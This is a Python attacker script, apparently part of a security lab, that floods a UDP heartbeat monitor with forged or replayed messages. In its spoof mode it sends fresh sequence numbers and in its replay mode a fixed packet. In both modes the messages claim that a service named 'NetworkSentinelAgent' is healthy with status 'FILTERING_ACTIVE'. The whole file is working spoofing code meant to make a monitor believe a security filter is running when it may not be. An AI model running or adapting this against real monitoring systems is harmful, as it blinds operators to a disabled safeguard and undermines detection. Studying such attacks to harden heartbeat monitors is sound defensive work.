import sys
import time
import config
import argparse
import json
import socket
from datetime import datetime, timezone


def _log(msg: str) -> None:
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"[{ts}] [attacker] {msg}", flush=True)


def run_spoof(
    monitor_host: str,
    monitor_port: int,
    interval: float,
    svc_name: str,
    mode: str,
) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    _log(f"Targeting monitor at {monitor_host}:{monitor_port}")
    _log(f"Attack mode: {mode} | Target Service: {svc_name}")
    _log(f"Starting delivery of forged heartbeat messages.")

    seq = 9999
    replay_packet = {
        "service": svc_name,
        "seq": 109,
        "timestamp": time.time(),
        "status": "FILTERING_ACTIVE",
    }

    try:
        while True:
            if mode == "replay":
                payload_data = replay_packet
            else:  # "spoof" mode
                payload_data = {
                    "service": svc_name,
                    "seq": seq,
                    "timestamp": time.time(),
                    "status": "FILTERING_ACTIVE",
                }
                seq += 1
            payload_bytes = json.dumps(payload_data).encode("utf-8")
            sock.sendto(payload_bytes, (monitor_host, monitor_port))

            _log(
                f"Injected forged heartbeat -> Seq: {payload_data['seq']} "
                f"| Timestamp: {payload_data['timestamp']:.2f}"
            )
            time.sleep(interval)
    except KeyboardInterrupt:
        _log("Adversarial script stopped.")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Heartbeat Monitor Attacker Script"
    )
    parser.add_argument(
        "--monitor-host",
        default=getattr(config, "MONITOR_HOST", config.HOST),
        help="Monitor UDP Host",
    )
    parser.add_argument(
        "--monitor-port",
        type=int,
        default=getattr(config, "MONITOR_PORT", 1025),
        help="Monitor UDP Port",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=1.0,
        help="Rate (in seconds) that spoofed heartbeats are transmitted",
    )
    parser.add_argument(
        "--svc-name",
        default="NetworkSentinelAgent",
        help="Service being spoofed",
    )
    parser.add_argument(
        "--mode",
        choices=["replay", "spoof"],
        default="spoof",
        help="Spoof Mode: crafts new packets | Replay Mode: Sends static packets",
    )

    args = parser.parse_args(argv)
    run_spoof(
        monitor_host=args.monitor_host,
        monitor_port=args.monitor_port,
        interval=args.interval,
        svc_name=args.svc_name,
        mode=args.mode,
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
